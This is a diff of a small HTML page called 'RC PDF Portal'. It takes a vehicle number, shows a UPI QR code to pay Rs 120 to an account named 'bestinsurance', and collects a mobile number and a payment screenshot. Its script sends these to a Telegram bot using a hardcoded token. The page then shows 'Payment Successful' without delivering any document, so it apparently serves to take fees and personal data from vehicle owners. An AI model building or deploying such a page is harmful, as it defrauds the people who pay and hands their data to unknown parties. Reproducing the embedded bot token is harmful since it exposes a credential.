@@ -1,12 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-<head/>
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>RC PDF Portal</title>
-
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6160012759159835"
-     crossorigin="anonymous"></script>
 
 <style>
 body{
@@ -27,19 +24,6 @@ min-height:100vh;
 100%{background-position:100%}
 }
 
-.home{
-position:fixed;
-top:12px;
-left:12px;
-background:white;
-color:black;
-padding:8px 16px;
-border-radius:10px;
-font-weight:bold;
-cursor:pointer;
-z-index:999;
-}
-
 .card{
 background:#000c;
 color:white;
@@ -50,7 +34,9 @@ max-width:420px;
 text-align:center;
 }
 
-input,button{
+.hidden{display:none;}
+
+button,input{
 width:100%;
 padding:12px;
 margin-top:10px;
@@ -65,69 +51,40 @@ font-weight:bold;
 cursor:pointer;
 }
 
-.hidden{display:none;}
-
-img{
-width:220px;
-border-radius:14px;
-margin:12px 0;
-}
-
-/* 🇮🇳 RGB NEON ASHOKA CHAKRA */
-.chakra-box{
+/* IND STYLE INPUT */
+.ind-box{
 display:flex;
-justify-content:center;
-margin-bottom:14px;
+align-items:center;
+background:#fff;
+border-radius:12px;
+border:2px solid #000;
+overflow:hidden;
+margin-top:10px;
 }
 
-.chakra{
-width:95px;
-height:95px;
-border-radius:50%;
-position:relative;
-background:
-conic-gradient(
-red, yellow, lime, cyan, blue, magenta, red
-);
-animation:spin 2.8s linear infinite;
-padding:5px;
-filter:drop-shadow(0 0 12px cyan);
-}
-
-.chakra::before{
-content:"";
-position:absolute;
-inset:5px;
-border-radius:50%;
-background:#000c;
-border:4px solid #0a3d91;
-}
-
-.chakra::after{
-content:"";
-position:absolute;
-top:50%;
-left:50%;
-width:4px;
-height:42px;
+.ind-tag{
 background:#0a3d91;
-transform:translate(-50%,-50%);
-box-shadow:
-0 0 8px #00f,
-0 0 12px cyan;
+color:#fff;
+padding:10px 14px;
+display:flex;
+flex-direction:column;
+align-items:center;
+font-weight:bold;
+font-size:14px;
 }
 
-.chakra span{
-position:absolute;
-top:50%;
-left:50%;
-width:42px;
-height:4px;
-background:#0a3d91;
-transform:translate(-50%,-50%);
-box-shadow:
-0 0 8px #00f,
-0 0 12px cyan;
+.ind-tag img{
+width:26px;
+margin-bottom:4px;
+animation:spin 2s linear infinite;
+}
+
+.ind-box input{
+border:none;
+padding:14px;
+font-size:16px;
+outline:none;
+flex:1;
 }
 
 @keyframes spin{
@@ -148,137 +105,85 @@ background-size:600% 600%;
 animation:bg 10s infinite alternate;
 border-radius:12px;
 }
-
-.footer p{margin:4px 0;}
 </style>
 </head>
 
 <body>
 
-<div class="home" onclick="goHome()">🏠 Home</div>
-
 <div class="card">
 
+<!-- PAGE 1 -->
 <div id="p1">
-<h3>🚗 Enter Vehicle Number 🏍️</h3>
+<h3>Enter Vehicle Number</h3>
 
-<div class="chakra-box">
-  <div class="chakra">
-    <span></span>
+<div class="ind-box">
+  <div class="ind-tag">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/17/Ashoka_Chakra.svg">
+    IND
   </div>
+  <input id="vehicle" placeholder="Enter Car No" maxlength="13" oninput="formatVehicle(this)">
 </div>
 
-<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
+<!-- PAGE 2 -->
 <div id="p2" class="hidden">
 <h3>Pay ₹120</h3>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBestInsurance%26am%3D120%26cu%3DINR">
+<img width="220" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=bestinsurance@upi&am=120">
+
 <p>UPI ID: bestinsurance@upi</p>
 
-<a href="upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
-<button>Pay with UPI App</button>
-</a>
-
 <input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof" accept="image/*">
+<input type="file" id="proof">
 
 <button onclick="submitPay()">Submit</button>
-
-<p style="font-size:13px;opacity:0.9;margin-top:6px;">
-<b>Submit करने के बाद 15 सेकंड का इंतज़ार करें जब तक पेमेंट का सफल स्थिति ना दिखे 🛑</b>
-</p>
 </div>
 
+<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h3>✅ Payment Successful</h3>
-<p>🎉Aapko jald hi aapka original RC ka PDF mil jayega🎊</p>
+<h3>Payment Successful</h3>
+<p>RC PDF will be sent soon</p>
 </div>
 
 </div>
 
 <div class="footer">
-<p>© All Rights Reserved 2026</p>
-<p>Mishra SERVICE ♥️❣️</p>
-<p>MAKE IN INDIA</p>
-<p>MADE WITH ♥️</p>
+<p>© 2026 Mishra Service</p>
 </div>
 
 <script>
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
-function vibrate(){
-if(navigator.vibrate) navigator.vibrate(40);
-}
-
 function formatVehicle(el){
-vibrate();
-let v = el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
-let p1=v.slice(0,2);
-let p2=v.slice(2,4);
-let p3=v.slice(4,6);
-let p4=v.slice(6,10);
-let out=p1;
-if(p2) out+="-"+p2;
-if(p3) out+="-"+p3;
-if(p4) out+="-"+p4;
+let v=el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
+let out=v.slice(0,2);
+if(v.slice(2,4)) out+="-"+v.slice(2,4);
+if(v.slice(4,6)) out+="-"+v.slice(4,6);
+if(v.slice(6)) out+="-"+v.slice(6,10);
 el.value=out;
 }
 
-function goHome(){
-p2.classList.add("hidden");
-p3.classList.add("hidden");
-p1.classList.remove("hidden");
-}
-
 function goPay(){
-if(!vehicle.value.trim()){
-alert("Vehicle number required");
-return;
-}
+if(!vehicle.value.trim()) return alert("Enter vehicle number");
 p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
 function submitPay(){
-let v=vehicle.value.trim();
-let m=mobile.value.trim();
-let p=proof.files[0];
-
-if(m.length<10){
-alert("Mobile number required");
-return;
-}
-if(!p){
-alert("Upload payment screenshot");
-return;
-}
-
 let data=new FormData();
 data.append("chat_id",chatId);
-data.append("caption",`🚗 RC REQUEST\nVehicle: ${v}\nMobile: ${m}`);
-data.append("photo",p);
+data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
+data.append("photo",proof.files[0]);
 
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
 method:"POST",
 body:data
-})
-.then(()=>{
+}).then(()=>{
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
-alert("Payment submitted successfully!");
-setTimeout(()=>{
-goHome();
-vehicle.value="";
-mobile.value="";
-proof.value="";
-},3000);
-})
-.catch(()=>{
-alert("Telegram send failed");
 });
 }
 </script>
